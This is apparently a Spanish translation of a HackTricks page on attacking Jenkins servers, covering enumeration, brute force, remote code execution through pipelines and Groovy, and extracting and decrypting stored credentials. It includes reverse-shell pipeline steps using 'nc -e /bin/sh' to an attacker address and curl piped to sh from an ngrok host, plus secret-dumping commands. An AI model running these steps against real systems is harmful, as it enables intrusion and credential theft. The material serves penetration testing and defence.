# Seguridad de Jenkins

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop).
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>

## Información básica

Jenkins ofrece una forma sencilla de configurar un entorno de **integración continua** o **entrega continua** (CI/CD) para casi **cualquier** combinación de **lenguajes** y repositorios de código fuente utilizando pipelines, así como automatizar otras tareas de desarrollo rutinarias. Si bien Jenkins no elimina la **necesidad de crear scripts para pasos individuales**, te brinda una forma más rápida y sólida de integrar toda tu cadena de herramientas de compilación, prueba e implementación de lo que puedes construir fácilmente por ti mismo.\
Definición obtenida [aquí](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html).

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Enumeración sin autenticación

Para buscar páginas interesantes de Jenkins sin autenticación (como _/people_ o _/asynchPeople_, que muestra los usuarios actuales), puedes utilizar:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
Verifique si puede ejecutar comandos sin necesidad de autenticación:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Sin credenciales, puedes ver el contenido de la ruta _**/asynchPeople/**_ o _**/securityRealm/user/admin/search/index?q=**_ para obtener **nombres de usuario**.

Puedes obtener la versión de Jenkins desde la ruta _**/oops**_ o _**/error**_

![](<../../.gitbook/assets/image (48).png>)

### Vulnerabilidades conocidas

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Inicio de sesión

En la información básica puedes verificar **todas las formas de iniciar sesión en Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Registro

Podrás encontrar instancias de Jenkins que **te permiten crear una cuenta e iniciar sesión en ella. Tan simple como eso.**

### Inicio de sesión SSO

Si también está presente la funcionalidad o los complementos de **SSO**, debes intentar iniciar sesión en la aplicación utilizando una cuenta de prueba (por ejemplo, una cuenta de **Github/Bitbucket** de prueba). Truco de [**aquí**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Fuerza bruta

Jenkins **no** implementa ninguna **política de contraseñas** ni mitigación de **fuerza bruta de nombres de usuario**. Por lo tanto, siempre debes intentar realizar ataques de fuerza bruta a los usuarios, ya que probablemente se estén utilizando contraseñas débiles (incluso nombres de usuario como contraseñas o nombres de usuario al revés como contraseñas).
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

Utiliza [este script de Python](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py) o [este script de PowerShell](https://github.com/chryzsh/JenkinsPasswordSpray).

### Bypass de lista blanca de IP

Muchas organizaciones combinan sistemas de gestión de control de código fuente (SCM) basados en SaaS (como GitHub o GitLab) con una solución de CI interna autohospedada (por ejemplo, Jenkins, TeamCity) que permite a estos sistemas de CI recibir eventos de webhook de los proveedores de control de código fuente SaaS, con el simple propósito de activar trabajos de canalización.

Por lo tanto, las organizaciones incluyen en la lista blanca los rangos de IP del SCM que les permiten llegar al sistema de CI interno con webhooks. Sin embargo, ten en cuenta que cualquier persona puede crear una cuenta en GitHub o GitLab y hacer que active un webhook que podría enviar una solicitud a ese sistema de CI interno.

{% content-ref url="scm-ip-whitelisting-bypass.md" %}
[scm-ip-whitelisting-bypass.md](scm-ip-whitelisting-bypass.md)
{% endcontent-ref %}

## Abusos internos de Jenkins

En estos escenarios, supondremos que tienes una cuenta válida para acceder a Jenkins.

{% hint style="warning" %}
Dependiendo del mecanismo de **Autorización** configurado en Jenkins y los permisos del usuario comprometido, es posible que puedas o no realizar los siguientes ataques.
{% endhint %}

Para obtener más información, consulta la información básica:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listar usuarios

Si has accedido a Jenkins, puedes listar otros usuarios registrados en [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Volcar compilaciones para encontrar secretos en texto claro

Utiliza [este script](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py) para volcar las salidas de la consola de compilación y las variables de entorno de compilación con la esperanza de encontrar secretos en texto claro.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **Robo de credenciales SSH**

Si el usuario comprometido tiene **suficientes privilegios para crear/modificar un nuevo nodo de Jenkins** y las credenciales SSH ya están almacenadas para acceder a otros nodos, podría **robar esas credenciales** creando/modificando un nodo y **configurando un host que registrará las credenciales** sin verificar la clave del host:

![](<../../.gitbook/assets/image (56).png>)

Por lo general, encontrará las credenciales SSH de Jenkins en un **proveedor global** (`/credentials/`), por lo que también puede extraerlas como lo haría con cualquier otro secreto. Más información en la sección de [**Extracción de secretos**](./#dumping-secrets).

### **RCE en Jenkins**

Obtener una **shell en el servidor de Jenkins** le da al atacante la oportunidad de filtrar todos los **secretos** y **variables de entorno** y de **explotar otras máquinas** ubicadas en la misma red o incluso de **obtener credenciales de la nube**.

De forma predeterminada, Jenkins ejecutará las compilaciones como **"sistema"**. En otras palabras, lo asignan al usuario **SYSTEM con todos los permisos**, lo que significa que cualquier acción ejecutada durante la compilación tiene permiso para hacer lo que quiera.

### **RCE Creando/Modificando un proyecto**

Crear/Modificar un proyecto es una forma de obtener RCE en el servidor de Jenkins:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Ejecutando un script Groovy**

También se puede obtener RCE ejecutando un script Groovy, lo cual puede ser más sigiloso que crear un nuevo proyecto:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Creando/Modificando un Pipeline

También se puede obtener **RCE creando/modificando un pipeline**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Explotación de Pipelines

Para explotar los pipelines, aún es necesario tener acceso a Jenkins.

### Pipelines de compilación

Los **pipelines** también se pueden utilizar como **mecanismo de compilación en proyectos**, en ese caso se puede configurar un **archivo dentro del repositorio** que contenga la sintaxis del pipeline. Por defecto se utiliza `/Jenkinsfile`:

![](<../../.gitbook/assets/image (14) (1) (1).png>)

También es posible **almacenar archivos de configuración de pipeline en otros lugares** (en otros repositorios, por ejemplo) con el objetivo de **separar** el acceso al repositorio y el acceso al pipeline.

Si un atacante tiene **permisos de escritura sobre ese archivo**, podrá **modificarlo** y **potencialmente activar** el pipeline sin siquiera tener acceso a Jenkins.\
Es posible que el atacante necesite **burlar algunas protecciones de rama** (dependiendo de la plataforma y los privilegios del usuario, se podrían burlar o no).

Los desencadenantes más comunes para ejecutar un pipeline personalizado son:

* **Pull request** a la rama principal (o potencialmente a otras ramas)
* **Push a la rama principal** (o potencialmente a otras ramas)
* **Actualizar la rama principal** y esperar hasta que se ejecute de alguna manera

{% hint style="info" %}
Si eres un **usuario externo**, no debes esperar poder crear una **PR en la rama principal** del repositorio de **otro usuario/organización** y **activar el pipeline**... pero si está **mal configurado**, podrías comprometer por completo a las empresas simplemente explotando esto.
{% endhint %}

### RCE en Pipelines

En la sección anterior sobre RCE, ya se indicó una técnica para [**obtener RCE modificando un pipeline**](./#rce-creating-modifying-pipeline).

### Verificación de variables de entorno

Es posible declarar **variables de entorno en texto claro** para todo el pipeline o para etapas específicas. Estas variables de entorno **no deben contener información confidencial**, pero un atacante siempre podría **verificar todas las configuraciones/pipelines** de un pipeline:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Extracción de secretos

Para obtener información sobre cómo se tratan normalmente los secretos en Jenkins, consulta la información básica:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Las credenciales pueden estar **asociadas a proveedores globales** (`/credentials/`) o a **proyectos específicos** (`/job/<nombre-del-proyecto>/configure`). Por lo tanto, para extraer todos ellos, necesitas **comprometer al menos todos los proyectos** que contienen secretos y ejecutar pipelines personalizados/envenenados.

Hay otro problema, para obtener un **secreto dentro del env** de un pipeline, necesitas **conocer el nombre y el tipo del secreto**. Por ejemplo, si intentas **cargar** un **secreto `usernamePassword`** como un **secreto `string`**, obtendrás este **error**:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Aquí tienes la forma de cargar algunos tipos comunes de secretos:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
Al final de esta página puedes **encontrar todos los tipos de credenciales**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
La mejor manera de **filtrar todas las contraseñas a la vez** es **comprometiendo** la máquina de **Jenkins** (por ejemplo, ejecutando un shell inverso en el **nodo incorporado**) y luego **filtrando** las **claves maestras** y las **contraseñas encriptadas** y descifrándolas sin conexión.\
Más información sobre cómo hacer esto en la sección [Nodos y Agentes](./#nodes-and-agents) y en la sección [Post Explotación](./#post-exploitation).
{% endhint %}

### Disparadores

Según [la documentación](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): La directiva `triggers` define las **formas automatizadas en las que se debe volver a activar el Pipeline**. Para los Pipelines que están integrados con una fuente como GitHub o BitBucket, es posible que no sea necesario utilizar `triggers`, ya que es probable que ya exista una integración basada en webhooks. Los disparadores disponibles actualmente son `cron`, `pollSCM` y `upstream`.

Ejemplo de cron:
```bash
triggers { cron('H */4 * * 1-5') }
```
Revisa **otros ejemplos en la documentación**.

### Nodos y Agentes

Una **instancia de Jenkins** puede tener **diferentes agentes ejecutándose en diferentes máquinas**. Desde la perspectiva de un atacante, el acceso a diferentes máquinas significa **diferentes credenciales de la nube potenciales** para robar o **diferente acceso a la red** que podría ser abusado para explotar otras máquinas.

Para obtener más información, consulta la información básica:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Puedes enumerar los **nodos configurados** en `/computer/`, generalmente encontrarás el **`Nodo Incorporado`** (que es el nodo que ejecuta Jenkins) y potencialmente más:

![](<../../.gitbook/assets/image (25).png>)

Es **especialmente interesante comprometer el nodo incorporado** porque contiene información sensible de Jenkins.

Para indicar que deseas **ejecutar** el **pipeline** en el **nodo incorporado de Jenkins**, puedes especificar la siguiente configuración dentro del pipeline:
```bash
pipeline {
agent {label 'built-in'}
```
### Ejemplo completo

Pipeline en un agente específico, con un disparador cron, con variables de entorno de pipeline y etapa, cargando 2 variables en un paso y enviando una shell inversa:

```groovy
pipeline {
    agent {
        label 'specific-agent'
    }
    triggers {
        cron('H 0 * * *')
    }
    environment {
        PIPELINE_VAR = 'pipeline-variable'
        STAGE_VAR = 'stage-variable'
    }
    stages {
        stage('Example Stage') {
            steps {
                script {
                    def var1 = 'variable-1'
                    def var2 = 'variable-2'
                    sh "echo $var1"
                    sh "echo $var2"
                    sh "nc -e /bin/sh <attacker-ip> <attacker-port>"
                }
            }
        }
    }
}
```

Este es un ejemplo de un pipeline en Jenkins que se ejecuta en un agente específico, con un disparador cron que lo ejecuta todos los días a la medianoche. El pipeline define dos variables de entorno, `PIPELINE_VAR` y `STAGE_VAR`, que se pueden utilizar en cualquier etapa del pipeline.

En la etapa de ejemplo, se definen dos variables locales, `var1` y `var2`, que se utilizan en los pasos siguientes. Luego, se ejecutan tres comandos shell. Los dos primeros comandos `echo` imprimen los valores de `var1` y `var2`, respectivamente. El tercer comando `nc` envía una shell inversa al atacante, utilizando la dirección IP y el puerto del atacante.

Este ejemplo muestra cómo se pueden utilizar variables de entorno y comandos shell en un pipeline de Jenkins para realizar diversas acciones, incluyendo la ejecución de comandos maliciosos. Es importante tener en cuenta que este ejemplo es solo con fines educativos y no se debe utilizar para actividades ilegales.
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
Metasploit es una herramienta de código abierto ampliamente utilizada en el campo de la seguridad informática. Proporciona una plataforma para realizar pruebas de penetración y explotar vulnerabilidades en sistemas informáticos. Metasploit se utiliza comúnmente en la fase de post-explotación, que es la etapa en la que un atacante ya ha comprometido un sistema y busca obtener acceso y control adicionales. Con Metasploit, los atacantes pueden ejecutar comandos en el sistema comprometido, recopilar información confidencial, robar contraseñas y realizar otras actividades maliciosas. Es una herramienta poderosa y versátil que puede ser utilizada tanto por profesionales de la seguridad como por atacantes malintencionados.
```
msf> post/multi/gather/jenkins_gather
```
### Secretos de Jenkins

Puedes listar los secretos accediendo a `/credentials/` si tienes suficientes permisos. Ten en cuenta que esto solo mostrará los secretos dentro del archivo `credentials.xml`, pero los **archivos de configuración de construcción** también pueden tener **más credenciales**.

Si puedes **ver la configuración de cada proyecto**, también puedes ver allí los **nombres de las credenciales (secretos)** que se utilizan para acceder al repositorio y **otras credenciales del proyecto**.

![](<../../.gitbook/assets/image (9) (1) (1).png>)

#### Desde Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Desde el disco

Estos archivos son necesarios para **descifrar los secretos de Jenkins**:

* secrets/master.key
* secrets/hudson.util.Secret

Tales **secretos generalmente se pueden encontrar en**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Aquí tienes una expresión regular para encontrarlos:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Descifrar secretos de Jenkins sin conexión

Si has volcado las **contraseñas necesarias para descifrar los secretos**, utiliza [**este script**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **para descifrar esos secretos**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Descifrar secretos de Jenkins desde Groovy

Si tienes acceso a ejecutar scripts Groovy en Jenkins, puedes utilizar el siguiente código para descifrar secretos almacenados en Jenkins:

```groovy
import hudson.util.Secret

def secret = Secret.decrypt("<encrypted_secret>")
println(secret.getPlainText())
```

Reemplaza `<encrypted_secret>` con el secreto cifrado que deseas descifrar. Al ejecutar este script, se imprimirá el secreto descifrado en la consola de Jenkins.

Es importante tener en cuenta que este enfoque solo funciona si tienes acceso para ejecutar scripts Groovy en Jenkins. Además, ten en cuenta que descifrar secretos puede ser una violación de la seguridad y solo debe hacerse con fines legítimos y autorizados, como parte de una evaluación de seguridad o pruebas de penetración.
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Crear un nuevo usuario administrador

1. Accede al archivo config.xml de Jenkins en `/var/lib/jenkins/config.xml` o `C:\Program Files (x86)\Jenkis\`.
2. Busca la palabra `<useSecurity>true</useSecurity>` y cambia la palabra **`true`** por **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Reinicia** el servidor de **Jenkins**: `service jenkins restart`.
4. Ahora vuelve al portal de Jenkins y esta vez **Jenkins no pedirá ninguna credencial**. Navega hasta "**Manage Jenkins**" para establecer la **contraseña del administrador nuevamente**.
5. **Habilita** la **seguridad** nuevamente cambiando la configuración a `<useSecurity>true</useSecurity>` y **reinicia Jenkins nuevamente**.

## Referencias

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF**, ¡consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
